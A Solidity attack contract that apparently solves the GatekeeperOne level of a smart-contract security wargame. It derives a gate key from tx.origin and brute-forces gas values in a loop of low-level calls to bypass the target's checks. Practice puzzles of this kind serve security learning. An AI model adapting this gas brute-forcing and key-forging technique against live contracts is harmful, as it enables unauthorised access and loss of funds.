// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne private gateKeeperOne;

    constructor(address _gateKeeperOneAddress) {
        gateKeeperOne = IGatekeeperOne(_gateKeeperOneAddress);
    }

    function attack() external {
        // Construct the gate key based on `tx.origin`
        bytes8 gateKey = bytes8(uint64(uint16(uint160(tx.origin))) | (1 << 32));

        // Brute force gas to pass the gateTwo check
        for (uint256 gasAmount = 8191 * 3; gasAmount < 8191 * 4; gasAmount++) {
            (bool success, ) = address(gateKeeperOne).call{gas: gasAmount}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );

            if (success) {
                break;
            }
        }
    }
}
